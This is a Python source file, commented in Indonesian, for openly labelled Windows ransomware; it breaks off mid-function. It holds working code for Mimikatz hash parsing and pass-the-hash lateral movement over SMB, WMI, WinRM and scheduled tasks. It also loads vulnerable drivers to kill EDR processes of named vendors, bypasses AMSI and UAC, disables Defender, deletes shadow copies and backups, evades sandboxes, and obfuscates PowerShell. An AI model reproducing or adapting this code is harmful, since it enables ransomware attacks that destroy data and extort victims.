# -*- coding: utf-8 -*-
import os
import sys
import time
import datetime
import subprocess
import shutil
import ctypes
import ctypes.wintypes
import winreg
import socket
import platform
import threading
import random
import base64
import string
import requests
import json
from pathlib import Path
import tkinter as tk
from tkinter import messagebox, filedialog

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad

# Konfigurasi
API_TOKEN = "lazarus"
SERVER_URL = "http://192.168.1.2:5000"

# Constants for DeviceIoControl
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000

FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
FILE_SHARE_DELETE = 0x00000004

OPEN_EXISTING = 0x00000003
OPEN_ALWAYS = 0x00000004

# IOCTL codes for common EDR killing operations
IOCTL_KILL_PROCESS = 0x2222008
IOCTL_TERMINATE_PROCESS = 0x222200C
IOCTL_ELEVATE_PRIVILEGE = 0x2222010
IOCTL_BYPASS_PROTECTION = 0x2222014
IOCTL_DISABLE_CALLBACKS = 0x2222018
IOCTL_UNLOAD_DRIVER = 0x222201C

class LateralMovement:
    """Lateral Movement Stealthy dengan WinRM Obfuscated + Mimikatz PTH + Immediate Execution (2026 Style)"""
    
    def __init__(self, ransomware_instance):
        self.rw = ransomware_instance
        self.successful_infections = []
        self.credentials = []                   # (username, ntlm_hash)
        self.max_targets = 8                    # Batasi agar tidak noisy
        self.delay_min = 5.0
        self.delay_max = 15.0

    def parse_mimikatz_credentials(self):
        """Parse username + NTLM hash dari hasil Mimikatz dump"""
        try:
            import glob
            dump_pattern = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "syslog_*.txt")
            dump_files = glob.glob(dump_pattern)
            
            if not dump_files:
                print("[-] Mimikatz dump not found → fallback to current user")
                user = os.getenv("USERNAME")
                domain = os.getenv("USERDOMAIN", ".")
                self.credentials.append((f"{domain}\\{user}", None))
                return
            
            for dump_file in dump_files:
                with open(dump_file, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                
                lines = content.splitlines()
                current_user = None
                for line in lines:
                    line = line.strip()
                    if "Username :" in line:
                        current_user = line.split(":", 1)[1].strip()
                    elif "NTLM     :" in line and current_user and current_user not in ["-", ""]:
                        ntlm = line.split(":", 1)[1].strip()
                        if len(ntlm) == 32 and ntlm != "00000000000000000000000000000000":
                            self.credentials.append((current_user, ntlm))
                            print(f"[+] PTH Credential parsed: {current_user}")
        except Exception as e:
            print(f"[-] Mimikatz parse failed: {e}")
            # Fallback
            user = os.getenv("USERNAME")
            self.credentials.append((user, None))

    def get_nearby_hosts(self):
        """Discovery sangat ringan (ARP cache + nearby IP)"""
        hosts = []
        try:
            output = subprocess.check_output("arp -a", shell=True, 
                                           creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
            for line in output.splitlines():
                parts = line.split()
                if len(parts) > 0 and parts[0].count('.') == 3:
                    ip = parts[0]
                    if ip != socket.gethostbyname(socket.gethostname()):
                        hosts.append(ip)
        except:
            pass
        
        # Fallback nearby IP (±20 dari IP lokal)
        try:
            base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
            my_octet = int(socket.gethostbyname(socket.gethostname()).split('.')[-1])
            for i in range(max(1, my_octet - 20), min(254, my_octet + 20)):
                ip = f"{base}.{i}"
                if ip not in hosts:
                    hosts.append(ip)
        except:
            pass
        
        return list(set(hosts))[:self.max_targets + 5]

    def copy_to_target(self, host):
        """Copy ransomware ke target via SMB Admin Share"""
        try:
            exe_name = os.path.basename(sys.executable)
            remote_path = f"\\\\{host}\\C$\\Windows\\Temp\\{exe_name}"
            
            result = subprocess.run(f'copy "{sys.executable}" "{remote_path}"', 
                                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
            return result.returncode == 0
        except:
            return False

    def execute_remote_payload(self, host, username=None):
        """Eksekusi ransomware di mesin target setelah copy berhasil"""
        exe_name = os.path.basename(sys.executable)
        remote_path = f"C:\\Windows\\Temp\\{exe_name}"
        
        try:
            # 1. WMI Direct Execution (paling cepat)
            if username:
                cmd_base = f'wmic /node:"{host}" /user:"{username}"'
            else:
                cmd_base = f'wmic /node:"{host}"'
            
            exec_cmd = f'{cmd_base} process call create "{remote_path}"'
            result = subprocess.run(exec_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            
            if result.returncode == 0:
                print(f"[+] Executed via WMI → {host}")
                return True

            # 2. WinRM Obfuscated Execution
            ps_raw = f"""
            Invoke-Command -ComputerName {host} -ScriptBlock {{
                Start-Process -FilePath "{remote_path}" -WindowStyle Hidden -ErrorAction SilentlyContinue
            }} -ErrorAction SilentlyContinue
            """
            obf_cmd = self.rw.generate_obfuscated_powershell(ps_raw, layers=4)
            subprocess.run(obf_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=12)
            print(f"[+] Executed via WinRM obfuscated → {host}")
            return True

        except:
            # 3. Fallback Scheduled Task + immediate run
            task_name = f"WinSysChk_{random.randint(1000,9999)}"
            task_cmd = f'schtasks /create /s {host} /tn "{task_name}" /tr "{remote_path}" /sc once /st 00:01 /ru SYSTEM /f'
            if username:
                task_cmd = f'schtasks /create /s {host} /u "{username}" /tn "{task_name}" /tr "{remote_path}" /sc once /st 00:01 /ru SYSTEM /f'
            
            subprocess.run(task_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=8)
            subprocess.run(f'schtasks /run /s {host} /tn "{task_name}"', 
                           shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
            
            print(f"[+] Executed via Scheduled Task → {host}")
            return True

    def lateral_move_to_host(self, host):
        """Proses lengkap untuk satu host: copy → execute"""
        if not self.copy_to_target(host):
            return False
        
        # Coba eksekusi dengan credential PTH
        for username, ntlm in self.credentials:
            if self.execute_remote_payload(host, username):
                self.successful_infections.append(host)
                return True
        
        # Fallback tanpa credential khusus
        if self.execute_remote_payload(host):
            self.successful_infections.append(host)
            return True
        
        return False

    def start(self):
        """Fungsi utama - panggil setelah credential dump"""
        print("[*] Starting stealth lateral movement (WinRM + PTH + Immediate Execution)...")
        
        self.parse_mimikatz_credentials()
        hosts = self.get_nearby_hosts()
        
        for host in hosts:
            if host == socket.gethostbyname(socket.gethostname()):
                continue
                
            print(f"[*] Attempting lateral to {host}...")
            self.lateral_move_to_host(host)
            
            # Delay acak sangat penting untuk menghindari noisy
            time.sleep(random.uniform(self.delay_min, self.delay_max))
        
        print(f"\n[+] Lateral movement completed → {len(self.successful_infections)} additional hosts infected")
        return self.successful_infections


class RansomWare:
    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None
        self.file_exts = [
            "exe", "dll", "so",
            "jpg", "jpeg", "bmp", "gif", "png", "svg", "psd", "raw",
            "mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape",
            "avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp",
            "doc", "docx", "xls", "xlsx", "ppt", "pptx",
            "odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md",
            "yml", "yaml", "json", "xml", "csv",
            "db", "sql", "dbf", "mdb", "iso",
            "html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css",
            "c", "cpp", "cxx", "h", "hpp", "hxx",
            "java", "class", "jar",
            "ps", "bat", "vb",
            "awk", "sh", "cgi", "pl", "ada", "swift",
            "go", "pyc", "bf", "coffee",
            "zip", "tar", "tgz", "bz2", "7z", "rar", "bak"
        ]
        self.persistence_methods = [
            self._add_startup_persistence,
            self._add_registry_persistence,
            self._add_scheduled_task,
        ]
        self.encrypted_extension = ".lazy"

        # Root directories to start Encryption/Decryption from
        if os.name == "nt":  # Windows
            self.sysRoot = os.path.expanduser("~")
        else:  # Linux/Mac
            self.sysRoot = os.path.expanduser("~")

        # Get public IP
        try:
            self.publicIP = requests.get("https://api.ipify.org", timeout=5).text
        except:
            self.publicIP = "Unknown"

    # ====================== RESOURCE PATH ======================
    def resource_path(self, relative_path):
        """Ambil absolute path untuk resources, bekerja untuk dev dan PyInstaller"""
        try:
            if hasattr(sys, '_MEIPASS'):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.abspath(".")
            
            path = os.path.join(base_path, relative_path)
            
            # Debug: Cek apakah file ada
            if not os.path.exists(path):
                # Fallback ke current directory
                alt_path = os.path.abspath(relative_path)
                if os.path.exists(alt_path):
                    return alt_path
                raise FileNotFoundError(f"File tidak ditemukan: {path} (Base path: {base_path})")
            
            return path
        except Exception as e:
            print(f"[!] Resource path error: {e}")
            return relative_path

    # ====================== SEND IOCTL (BYOVD COMMUNICATION) ======================
    def send_ioctl(self, device_name, ioctl_code, input_buffer=None, output_buffer_size=1024):
        """
        Send IOCTL command to kernel driver for EDR killing or privilege escalation.
        
        Args:
            device_name: Name of the device (e.g., "rwdrv", "\\\\.\\rwdrv", or "rwdrv.sys")
            ioctl_code: IOCTL code to send (e.g., 0x2222008)
            input_buffer: Optional input data to send to driver
            output_buffer_size: Size of output buffer in bytes
        
        Returns:
            tuple: (success, output_data)
        """
        if os.name != "nt":
            print("[!] IOCTL only supported on Windows")
            return False, None
        
        try:
            kernel32 = ctypes.windll.kernel32
            kernel32.CreateFileW.argtypes = [
                ctypes.c_wchar_p, ctypes.c_uint32, ctypes.c_uint32,
                ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p
            ]
            kernel32.CreateFileW.restype = ctypes.c_void_p
            
            kernel32.DeviceIoControl.argtypes = [
                ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32,
                ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_void_p
            ]
            kernel32.DeviceIoControl.restype = ctypes.c_bool
            
            kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
            kernel32.CloseHandle.restype = ctypes.c_bool
            
            # Format device path correctly
            if not device_name.startswith("\\\\.\\"):
                if device_name.endswith(".sys"):
                    device_name = f"\\\\.\\{device_name[:-4]}"
                else:
                    device_name = f"\\\\.\\{device_name}"
            
            print(f"[*] Opening device: {device_name}")
            
            # Open device handle
            handle = kernel32.CreateFileW(
                device_name,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                0,
                None
            )
            
            if handle == -1 or handle == 0:
                # Try different access modes
                handle = kernel32.CreateFileW(
                    device_name,
                    GENERIC_READ,
                    FILE_SHARE_READ,
                    None,
                    OPEN_EXISTING,
                    0,
                    None
                )
                
            if handle == -1 or handle == 0:
                error = ctypes.GetLastError()
                print(f"[!] Failed to open device {device_name}, error: {error}")
                return False, None
            
            print(f"[+] Device opened successfully, handle: {handle}")
            
            # Prepare input buffer if provided
            in_buffer = None
            in_buffer_size = 0
            if input_buffer is not None:
                if isinstance(input_buffer, int):
                    # Convert integer to bytes
                    in_buffer = ctypes.create_string_buffer(4)
                    ctypes.memmove(in_buffer, ctypes.byref(ctypes.c_uint32(input_buffer)), 4)
                    in_buffer_size = 4
                elif isinstance(input_buffer, bytes):
                    in_buffer = ctypes.create_string_buffer(input_buffer)
                    in_buffer_size = len(input_buffer)
                elif isinstance(input_buffer, str):
                    in_buffer = ctypes.create_string_buffer(input_buffer.encode('utf-16le'))
                    in_buffer_size = len(input_buffer) * 2
                elif hasattr(input_buffer, '__len__'):
                    in_buffer = ctypes.create_string_buffer(bytes(input_buffer))
                    in_buffer_size = len(input_buffer)
                else:
                    in_buffer = ctypes.byref(ctypes.c_uint32(input_buffer))
                    in_buffer_size = 4
            
            # Prepare output buffer
            out_buffer = ctypes.create_string_buffer(output_buffer_size)
            bytes_returned = ctypes.c_uint32(0)
            
            # Send IOCTL
            print(f"[*] Sending IOCTL {hex(ioctl_code)} to {device_name}")
            
            result = kernel32.DeviceIoControl(
                handle,
                ioctl_code,
                in_buffer,
                in_buffer_size,
                out_buffer,
                output_buffer_size,
                ctypes.byref(bytes_returned),
                None
            )
            
            # Get output data
            output_data = None
            if result and bytes_returned.value > 0:
                output_data = out_buffer.raw[:bytes_returned.value]
                print(f"[+] IOCTL successful, received {bytes_returned.value} bytes")
            elif result:
                print(f"[+] IOCTL successful (no output data)")
            else:
                error = ctypes.GetLastError()
                print(f"[!] DeviceIoControl failed, error: {error}")
            
            # Close handle
            kernel32.CloseHandle(handle)
            
            return result, output_data
            
        except Exception as e:
            print(f"[!] IOCTL exception: {e}")
            return False, None
    
    def kill_edr_process_by_pid(self, device_name, pid):
        """
        Kill EDR process using vulnerable driver.
        
        Args:
            device_name: Vulnerable driver device name
            pid: Process ID to kill
        
        Returns:
            bool: True if successful
        """
        try:
            # Many vulnerable drivers use this IOCTL structure
            # Input: PID (4 bytes)
            result, _ = self.send_ioctl(device_name, IOCTL_KILL_PROCESS, pid)
            return result
        except Exception as e:
            print(f"[!] Failed to kill process {pid}: {e}")
            return False
    
    def kill_edr_process_by_name(self, device_name, process_name):
        """
        Kill EDR process by name using vulnerable driver.
        
        Args:
            device_name: Vulnerable driver device name
            process_name: Name of process to kill (e.g., "MsMpEng.exe")
        
        Returns:
            bool: True if successful
        """
        try:
            # Find process ID
            pids = []
            output = subprocess.check_output(
                f'tasklist /fi "imagename eq {process_name}" /fo csv /nh',
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            ).decode('utf-8')
            
            for line in output.strip().split('\n'):
                if line:
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2 and parts[0].lower() == process_name.lower():
                        try:
                            pid = int(parts[1])
                            pids.append(pid)
                        except:
                            pass
            
            success = False
            for pid in pids:
                if self.kill_edr_process_by_pid(device_name, pid):
                    print(f"[+] Killed {process_name} (PID: {pid})")
                    success = True
                else:
                    print(f"[-] Failed to kill {process_name} (PID: {pid})")
            
            return success
        except Exception as e:
            print(f"[!] Failed to kill process by name {process_name}: {e}")
            return False
    
    def elevate_privilege_via_driver(self, device_name):
        """
        Attempt privilege escalation using vulnerable driver.
        
        Args:
            device_name: Vulnerable driver device name
        
        Returns:
            bool: True if successful
        """
        try:
            # Try to send token stealing IOCTL
            result, output = self.send_ioctl(device_name, IOCTL_ELEVATE_PRIVILEGE)
            return result
        except Exception as e:
            print(f"[!] Privilege escalation failed: {e}")
            return False
    
    def disable_edr_callbacks(self, device_name):
        """
        Disable EDR kernel callbacks using vulnerable driver.
        
        Args:
            device_name: Vulnerable driver device name
        
        Returns:
            bool: True if successful
        """
        try:
            # Try to disable callbacks
            result, _ = self.send_ioctl(device_name, IOCTL_DISABLE_CALLBACKS)
            return result
        except Exception as e:
            print(f"[!] Failed to disable callbacks: {e}")
            return False
    
    def scan_and_kill_edr_processes(self, device_name):
        """
        Scan for common EDR processes and kill them using vulnerable driver.
        
        Args:
            device_name: Vulnerable driver device name
        """
        edr_processes = [
            "MsMpEng.exe",      # Windows Defender
            "Sense.exe",        # Windows Defender Advanced Threat Protection
            "MsSense.exe",      # Windows Defender Sense
            "NisSrv.exe",       # Windows Defender Network Inspection
            "SecurityHealthService.exe",
            "CrowdStrike.exe",  # CrowdStrike Falcon
            "CSFalconService.exe",
            "csagent.exe",
            "CylanceSvc.exe",   # Cylance
            "CylanceUI.exe",
            "Sophos.exe",       # Sophos
            "SophosUI.exe",
            "SAVAdminService.exe",
            "McAfee.exe",       # McAfee
            "mcshield.exe",
            "VsTskMgr.exe",
            "Symantec.exe",     # Symantec
            "ccSvcHst.exe",
            "Rtvscan.exe",
            "Kaspersky.exe",    # Kaspersky
            "avp.exe",
            "kavfs.exe",
            "TrendMicro.exe",   # Trend Micro
            "TMBMSRV.exe",
            "CoreServiceShell.exe",
            "ESET.exe",         # ESET
            "ekrn.exe",
            "egui.exe",
            "BitDefender.exe",  # Bitdefender
            "bdagent.exe",
            "vsserv.exe",
            "Avast.exe",        # Avast
            "AvastSvc.exe",
            "AvastUI.exe",
            "AVG.exe",          # AVG
            "avgui.exe",
            "avgsvc.exe",
            "CarbonBlack.exe",  # Carbon Black
            "cb.exe",
            "SentinelAgent.exe", # SentinelOne
            "SentinelOne.exe",
            "PaloAlto.exe",     # Palo Alto Cortex
            "Cortex.exe",
            "Cybereason.exe",   # Cybereason
            "CybereasonSensor.exe",
            "AvastUI.exe",
            "uiWatchDog.exe"
        ]
        
        print(f"[*] Scanning and killing EDR processes using {device_name}")
        
        for proc in edr_processes:
            try:
                self.kill_edr_process_by_name(device_name, proc)
            except:
                pass
            
            # Also try taskkill as fallback
            try:
                subprocess.run(
                    f'taskkill /f /im {proc}',
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                pass
    
    # ====================== OBFUSCATED POWERSHELL GENERATOR ======================
    def generate_obfuscated_powershell(self, original_cmd: str, layers: int = 3) -> str:
        """Deep obfuscation: string concat + multi-layer base64 + junk code"""
        try:
            junk_vars = []
            for _ in range(6):
                var_name = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 12)))
                junk_value = ''.join(random.choices(string.ascii_letters + string.digits + "_", k=random.randint(15, 35)))
                junk_vars.append(f"${var_name} = '{junk_value}';")

            # Chunking + concatenation
            chunk_size = max(4, len(original_cmd) // 7)
            chunks = [original_cmd[i:i+chunk_size] for i in range(0, len(original_cmd), chunk_size)]
            concat_part = " + ".join([f"'{c.replace(chr(39), chr(39)+chr(39))}'" for c in chunks])

            obfuscated = ";".join(junk_vars) + f" $real = {concat_part};"

            for _ in range(layers):
                b64 = base64.b64encode(obfuscated.encode('utf-8')).decode('utf-8')
                b64_parts = [b64[i:i+25] for i in range(0, len(b64), 25)]
                b64_obf = " + ".join([f"'{p}'" for p in b64_parts])
                obfuscated = f"""$a='';$b=0;iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({b64_obf})))"""

            final = f'powershell -nop -w hidden -c "{obfuscated}"'
            return final
        except Exception as e:
            print(f"[!] Obfuscation failed: {e}")
            return f'powershell -nop -w hidden -c "{original_cmd}"'

    # ====================== AMSI BYPASS ======================
    def amsi_bypass_and_obfuscated_powershell(self):
        """AMS bypass menggunakan multiple teknik + obfuscation"""
        amsi_bypass_scripts = [
            # Teknik 1: Patch AMSI via reflection
            '''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)''',
            
            # Teknik 2: AMSI bypass via registry
            '''Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Name "Enabled" -Value 0 -Force''',
            
            # Teknik 3: AMSI bypass via environment variable
            '''$env:__PSLockdownPolicy=1; [System.Environment]::SetEnvironmentVariable('__PSLockdownPolicy','1','User')'''
        ]
        
        for script in amsi_bypass_scripts:
            obf = self.generate_obfuscated_powershell(script, layers=3)
            try:
                subprocess.run(obf, shell=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW | getattr(subprocess, 'SW_HIDE', 0),
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            except Exception as e:
                print(f"[!] AMSI bypass attempt failed: {e}")
        
        print("[+] AMSI bypass attempts completed")

    # ====================== ANTI-ANALYSIS ======================
    def is_sandbox_or_vm(self) -> bool:
        try:
            # Uptime rendah
            try:
                uptime = ctypes.windll.kernel32.GetTickCount64() / 1000 / 60
                if uptime < 8:
                    return True
            except:
                pass

            # Process analysis tools
            bad_procs = ["x64dbg", "ollydbg", "ida", "wireshark", "procmon", "vbox", "vmtools", "qemu", "virtualbox", "process explorer", "immunity", "burp", "tcpdump", "pestudio"]
            try:
                output = subprocess.check_output("tasklist", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore').lower()
                for p in bad_procs:
                    if p in output:
                        return True
            except:
                pass

            # VM registry
            vm_keys = [r"SYSTEM\CurrentControlSet\Services\VBoxGuest", r"SOFTWARE\VMware, Inc.", r"SOFTWARE\Oracle\VirtualBox Guest Additions"]
            for k in vm_keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, k)
                    return True
                except:
                    pass

            return False
        except:
            return False

    def anti_analysis_sleep(self):
        if self.is_sandbox_or_vm():
            print("[-] Sandbox/VM detected - sleeping long...")
            time.sleep(random.randint(1800, 7200))  # 30 menit - 2 jam
        else:
            time.sleep(random.randint(3, 15))

    # ====================== UAC BYPASS ======================
    def silent_uac_bypass(self):
        """Advanced UAC bypass that works completely silently without showing any prompts"""
        if os.name != "nt":
            return False

        try:
            # First check if we're already admin
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True

            # Technique 1: Use fodhelper.exe auto-elevation (Windows 10/11)
            def fodhelper_bypass():
                try:
                    import tempfile

                    # Create temporary batch file
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
                    tmp.write(f'@start /b "" "{sys.executable}"'.encode())
                    tmp.close()

                    # Modify registry
                    key_path = r"Software\Classes\ms-settings\shell\open\command"
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, tmp.name)
                        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

                    # Execute fodhelper silently
                    subprocess.Popen(
                        "fodhelper.exe",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.PIPE,
                    )

                    # Cleanup
                    time.sleep(3)
                    os.unlink(tmp.name)
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    return True
                except Exception as e:
                    print(f"[!] Fodhelper bypass failed: {e}")
                    return False

            # Try all techniques in sequence
            if fodhelper_bypass():
                sys.exit(0)
            else:
                # Fallback to traditional method
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, None, 0
                )
                sys.exit(0)

        except Exception as e:
            print(f"[!] Silent UAC bypass failed: {e}")
            return False

    def disable_uac_completely(self):
        """Completely disable UAC without notifications or restart"""
        if os.name != "nt":
            return False

        try:
            # Disable UAC via registry
            reg_commands = [
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f',
            ]

            for cmd in reg_commands:
                subprocess.run(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

            print("[+] UAC completely disabled")
            return True
        except Exception as e:
            print(f"[!] Failed to disable UAC: {e}")
            return False

    def run_as_admin(self):
        if os.name != "nt":
            return True

        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                script = os.path.abspath(sys.argv[0])
                params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, f'"{script}" {params}', None, 1
                )
                sys.exit(0)
            return True
        except Exception as e:
            print(f"[!] Gagal minta akses administrator: {e}")
            return False

    # ====================== DISABLE ANTIVIRUS ======================
    def try_disable_antivirus(self):
        if os.name != "nt":
            print("[!] Antivirus disable only supported on Windows.")
            return

        print("[*] Attempting to disable antivirus via registry modifications...")

        try:
            import winreg

            # Registry keys to disable Windows Defender
            defender_keys = [
                (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
                (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
                (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 1),
                (r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
                (r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", 0),
            ]

            for key_path, value_name, value_data in defender_keys:
                try:
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                    winreg.CloseKey(key)
                    print(f"[+] Set {key_path}\\{value_name} = {value_data}")
                except Exception as e:
                    print(f"[!] Failed to set {key_path}\\{value_name}: {e}")

            # Stop services immediately
            services = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService"]
            for service in services:
                try:
                    subprocess.run(
                        f"net stop {service}",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    print(f"[+] Stopped service: {service}")
                except Exception as e:
                    print(f"[!] Failed to stop service {service}: {e}")

            print("[+] Antivirus disabled via registry modifications")
        except Exception as e:
            print(f"[!] Could not disable antivirus via registry: {e}")

    # ====================== LOTL + OBFUSCATED COMMANDS ======================
    def lotl_disable_defender_and_shadow(self):
        base_cmds = [
            "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true",
            "vssadmin delete shadows /all /quiet",
            "wmic shadowcopy delete /nointeractive",
            "wbadmin delete catalog -quiet",
            "bcdedit /set {default} recoveryenabled No",
            "taskkill /f /im MsMpEng.exe /im Sense.exe",
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
        ]

        for cmd in base_cmds:
            obf = self.generate_obfuscated_powershell(cmd, layers=2)
            try:
                subprocess.run(obf, shell=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            except Exception as e:
                print(f"[!] LOTL command failed: {e}")

    # ====================== DLL SIDE-LOADING ======================
    def dll_side_loading_qilin_style(self):
        try:
            dll_source = self.resource_path("malicious_msimg32.dll")
            if not os.path.exists(dll_source):
                print("[!] DLL source not found, skipping side-loading")
                return False

            target_dll = os.path.join(os.environ["SystemRoot"], "System32", "msimg32.dll")
            backup_dll = os.path.join(os.environ["SystemRoot"], "System32", "msimg32_real.dll")

            if not os.path.exists(backup_dll):
                shutil.copy2(target_dll, backup_dll)

            shutil.copy2(dll_source, target_dll)
            print("[+] Malicious msimg32.dll side-loaded (Qilin style)")

            # Trigger loading
            subprocess.run('rundll32.exe user32.dll,UpdatePerUserSystemParameters',
                           shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return True
        except Exception as e:
            print(f"[-] DLL side-loading failed: {e}")
            return False

    # ====================== BYOVD EDR KILLER ======================
    def try_byovd_edr_killer(self):
        drivers = [
            {"name": "rwdrv.sys", "service": "rwdrv", "device": "rwdrv"},
            {"name": "hlpdrv.sys", "service": "hlpdrv", "device": "hlpdrv"},
            {"name": "zamguard64.sys", "service": "zam", "device": "zam"},
            {"name": "gdrv.sys", "service": "gdrv", "device": "gdrv"},
            {"name": "NSecKrnl.sys", "service": "NSecKrnl", "description": "Reynolds style"},
            {"name": "wsftprm.sys", "service": "wsftprm"},
        ]

        for drv in drivers:
            try:
                src = self.resource_path(drv["name"])
                if not os.path.exists(src):
                    continue

                target_path = os.path.join(os.environ["SystemRoot"], "System32", f"{os.urandom(4).hex()}.sys")
                shutil.copy2(src, target_path)

                svc_name = drv["service"] + os.urandom(2).hex()
                
                # Create service
                create_result = subprocess.run(
                    f'sc create {svc_name} binPath= "{target_path}" type= kernel start= demand',
                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW, 
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                
                if create_result.returncode != 0:
                    print(f"[-] Failed to create service for {drv['name']}")
                    continue
                
                # Start service
                start_result = subprocess.run(
                    f'sc start {svc_name}',
                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                
                if start_result.returncode != 0:
                    print(f"[-] Failed to start service for {drv['name']}")
                    continue

                print(f"[+] BYOVD loaded: {drv['name']} as {svc_name}")
                
                # Use IOCTL to kill EDR processes
                device_name = drv["device"]
                
                # Try to elevate privilege first
                if self.elevate_privilege_via_driver(device_name):
                    print(f"[+] Privilege escalation successful via {device_name}")
                
                # Disable EDR callbacks
                if self.disable_edr_callbacks(device_name):
                    print(f"[+] EDR callbacks disabled via {device_name}")
                
                # Kill EDR processes using IOCTL
                self.scan_and_kill_edr_processes(device_name)
                
                return True
                
            except Exception as e:
                print(f"[-] BYOVD {drv['name']} failed: {e}")
        
        return False

    # ====================== CREDENTIAL DUMP ======================
    def credential_dump_lotl_mimikatz(self):
        try:
